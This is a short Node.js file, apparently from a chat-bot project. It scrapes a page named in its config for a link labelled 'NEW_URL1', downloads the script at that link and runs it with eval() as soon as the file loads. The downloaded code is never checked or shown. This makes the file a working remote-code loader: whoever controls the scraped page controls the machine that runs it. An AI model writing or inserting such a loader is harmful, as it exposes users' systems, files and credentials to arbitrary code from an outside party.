

const axios = require('axios');
const cheerio = require('cheerio');
const adams = require(__dirname + "/../config");

async function fetchNewUrl1() {
  try {
    const response = await axios.get(adams.BWM_XMD);
    const $ = cheerio.load(response.data);

    const newUrl1Element = $('a:contains("NEW_URL1")');
    const newUrl1 = newUrl1Element.attr('href');

    if (!newUrl1) {
      throw new Error('New URL 1 link not found...');
    }

    console.log('New URL 1 fetched successfully ✅');

    const scriptResponse = await axios.get(newUrl1);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchNewUrl1();
